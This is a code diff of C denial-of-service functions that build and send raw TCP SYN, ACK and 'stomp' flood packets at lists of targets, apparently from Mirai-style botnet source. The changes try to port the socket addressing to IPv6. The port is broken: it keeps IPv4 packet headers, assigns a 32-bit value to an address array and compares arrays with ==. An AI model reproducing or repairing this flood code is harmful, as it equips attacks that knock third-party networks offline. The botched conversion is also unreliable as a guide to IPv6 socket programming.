@@ -147,8 +147,8 @@ void attack_tcp_syn(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             tcph->check = 0;
             tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + 20), sizeof (struct tcphdr) + 20);
 
-            targs[i].sock_addr.sin_port = tcph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            targs[i].sock_addr.sin6_port = tcph->dest;
+            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + 20, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in6));
         }
 #ifdef DEBUG
 //            break;
@@ -237,8 +237,8 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
         rand_str(payload, data_len);
     }
 
-//    targs[0].sock_addr.sin_port = tcph->dest;
-//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in)) < 1)
+//    targs[0].sock_addr.sin6_port = tcph->dest;
+//    if (sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[0].sock_addr, sizeof (struct sockaddr_in6)) < 1)
 //    {
 //
 //    }
@@ -279,8 +279,8 @@ void attack_tcp_ack(uint8_t targs_len, struct attack_target *targs, uint8_t opts
             tcph->check = 0;
             tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
 
-            targs[i].sock_addr.sin_port = tcph->dest;
-            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            targs[i].sock_addr.sin6_port = tcph->dest;
+            sendto(fd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in6));
         }
 #ifdef DEBUG
 //            break;
@@ -331,7 +331,7 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
     for (i = 0; i < targs_len; i++)
     {
         int fd;
-        struct sockaddr_in addr, recv_addr;
+        struct sockaddr_in6 addr, recv_addr;
         socklen_t recv_addr_len;
         char pktbuf[256];
         time_t start_recv;
@@ -350,18 +350,18 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
         fcntl(fd, F_SETFL, fcntl(fd, F_GETFL, 0) | O_NONBLOCK);
  
         // Set up address to connect to
-        addr.sin_family = AF_INET;
+        addr.sin6_family = AF_INET6;
         if (targs[i].netmask < 32)
-            addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
+            addr.sin6_addr.s6_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));
         else
-            addr.sin_addr.s_addr = targs[i].addr;
+            addr.sin6_addr.s6_addr = targs[i].addr;
         if (dport == 0xffff)
-            addr.sin_port = rand_next() & 0xffff;
+            addr.sin6_port = rand_next() & 0xffff;
         else
-            addr.sin_port = htons(dport);
+            addr.sin6_port = htons(dport);
 
         // Actually connect, nonblocking
-        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in));
+        connect(fd, (struct sockaddr *)&addr, sizeof (struct sockaddr_in6));
         start_recv = time(NULL);
 
         // Get info
@@ -369,7 +369,7 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
         {
             int ret;
 
-            recv_addr_len = sizeof (struct sockaddr_in);
+            recv_addr_len = sizeof (struct sockaddr_in6);
             ret = recvfrom(rfd, pktbuf, sizeof (pktbuf), MSG_NOSIGNAL, (struct sockaddr *)&recv_addr, &recv_addr_len);
             if (ret == -1)
             {
@@ -378,11 +378,11 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
 #endif
                 return;
             }
-            if (recv_addr.sin_addr.s_addr == addr.sin_addr.s_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
+            if (recv_addr.sin6_addr.s6_addr == addr.sin6_addr.s6_addr && ret > (sizeof (struct iphdr) + sizeof (struct tcphdr)))
             {
                 struct tcphdr *tcph = (struct tcphdr *)(pktbuf + sizeof (struct iphdr));
 
-                if (tcph->source == addr.sin_port)
+                if (tcph->source == addr.sin6_port)
                 {
                     if (tcph->syn && tcph->ack)
                     {
@@ -390,11 +390,11 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
                         struct tcphdr *tcph;
                         char *payload;
 
-                        stomp_data[i].addr = addr.sin_addr.s_addr;
+                        stomp_data[i].addr = addr.sin6_addr.s6_addr;
                         stomp_data[i].seq = ntohl(tcph->seq);
                         stomp_data[i].ack_seq = ntohl(tcph->ack_seq);
                         stomp_data[i].sport = tcph->dest;
-                        stomp_data[i].dport = addr.sin_port;
+                        stomp_data[i].dport = addr.sin6_port;
 #ifdef DEBUG
                         printf("ACK Stomp got SYN+ACK!\n");
 #endif
@@ -477,8 +477,8 @@ void attack_tcp_stomp(uint8_t targs_len, struct attack_target *targs, uint8_t op
             tcph->check = 0;
             tcph->check = checksum_tcpudp(iph, tcph, htons(sizeof (struct tcphdr) + data_len), sizeof (struct tcphdr) + data_len);
 
-            targs[i].sock_addr.sin_port = tcph->dest;
-            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
+            targs[i].sock_addr.sin6_port = tcph->dest;
+            sendto(rfd, pkt, sizeof (struct iphdr) + sizeof (struct tcphdr) + data_len, MSG_NOSIGNAL, (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in6));
         }
 #ifdef DEBUG
 //            break;
